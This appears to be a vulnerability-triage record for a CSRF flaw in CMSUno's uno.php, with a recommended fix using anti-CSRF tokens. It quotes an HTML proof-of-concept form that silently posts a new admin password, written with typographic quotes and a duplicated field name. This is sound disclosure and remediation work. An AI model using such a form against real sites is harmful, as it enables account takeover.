proposal.summary: CMSUno before 1.6.1 contains a cross-site request forgery (CSRF) vulnerability in uno.php that allows changing the admin password via a crafted POST request.
proposal.cwe_quote: uno.php allows CSRF to change the admin password.

UI.quote:
PoC :

<html>
<body>
<script>history.pushState(",",'/')</script>
<form action=“http://127.0.0.1/cmsuno-master/uno.php”method=“POST”>
<input type=“hidden” name=“user” value=“admin”/>
<input type=“hidden” name=“pass” value=“yourpassword”/>
<input type=“submit” name=“user” value=“Submit request”/>
</form>
</body>
</html>

I.quote: uno.php allows CSRF to change the admin password.

proposal.recommended_next_step: Verify the vulnerability by reproducing the POST request against a test instance and determine whether CSRF protections (anti-CSRF tokens, SameSite cookies, or referer checks) are absent; if confirmed, patch uno.php to require a server-side anti-CSRF token and release fixes and mitigation guidance.

evidence_quotes.quote: uno.php allows CSRF to change the admin password.

evidence_quotes.claim: PoC supplies admin username and new password
